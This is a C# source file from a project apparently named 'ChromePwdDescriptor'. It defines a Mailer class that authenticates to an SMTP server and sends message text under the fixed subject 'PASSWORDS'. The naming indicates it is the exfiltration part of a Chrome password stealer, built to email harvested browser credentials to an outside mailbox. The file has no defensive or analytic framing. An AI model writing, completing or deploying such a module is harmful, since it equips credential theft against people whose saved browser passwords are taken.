using System.Net;
using System.Net.Mail;

namespace ChromePwdDescriptor
{
	public class Mailer
	{
		private readonly MailAddress fromMail;
		private readonly SmtpClient smtpClient;

		private readonly string subject = "PASSWORDS";

		public Mailer(string host, int port, string login, string pwd)
		{
			this.fromMail = new MailAddress(login, subject);

			this.smtpClient = new SmtpClient
			{
				Host = host,
				Port = port,
				EnableSsl = true,
				DeliveryMethod = SmtpDeliveryMethod.Network,
				UseDefaultCredentials = false,
				Credentials = new NetworkCredential(this.fromMail.Address, pwd)
			};
		}

		~Mailer()
		{
			this.smtpClient.Dispose();
		}

		public bool SendMail(string email, string messageText)
		{
			using (MailMessage message = new MailMessage(this.fromMail, new MailAddress(email)))
			{
				message.Subject = subject;
				message.Body = messageText;

				bool result;

				try
				{
					this.smtpClient.Send(message);

					result = true;
				}
				catch
				{
					result = false;
				}

				return result;
			}
		}
	}
}
